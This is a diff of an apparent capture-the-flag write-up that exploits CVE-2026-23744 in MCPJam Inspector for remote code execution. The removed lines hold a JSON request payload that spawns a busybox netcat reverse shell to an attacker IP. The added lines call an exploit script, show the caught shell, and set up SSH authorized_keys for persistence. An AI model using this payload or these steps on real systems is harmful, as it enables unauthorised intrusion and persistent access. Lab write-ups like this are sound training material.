@@ -52,31 +52,20 @@ PORT     STATE SERVICE VERSION
 |_    Connection: close
 ```
 
-Running vulnerable web application hosting MCPJam Inspector. Leverage [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) to achieve RCE:
+Running vulnerable web application hosting MCPJam Inspector. Leverage [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) to achieve RCE, using this [script](exploit.py):
 
 ```sh
-$ nc -nlvp 9999
+$ python exploit.py --target http://devhub.htb:6274 --ip 10.10.17.81 --port 9001
 ```
 
-```
-POST /api/mcp/connect HTTP/1.1
-Host: 10.129.53.145:6274
-Content-Type: application/json
-Content-Length: 207
-
-{
-    "serverConfig":
-    {
-        "command": "busybox",
-        "args": [
-                "nc",
-                "10.10.14.11",
-                "9999",
-                "-e",
-                "/bin/bash"
-                ],
-        "env":{}
-    },
-    serverId":"pucarevshell"
-}
+```sh
+$ nc -nvlp 9001
+listening on [any] 9001 ...
+connect to [10.10.17.81] from (UNKNOWN) [10.129.9.129] 47686
+script -qc /bin/bash /dev/null
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ mkdir -p ~/.ssh
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ chmod 700 ~/.ssh
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ chmod 600 ~/.ssh/authorized_keys
+mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ chmod 644 ~/.ssh/id_ed25519.pub
 ```
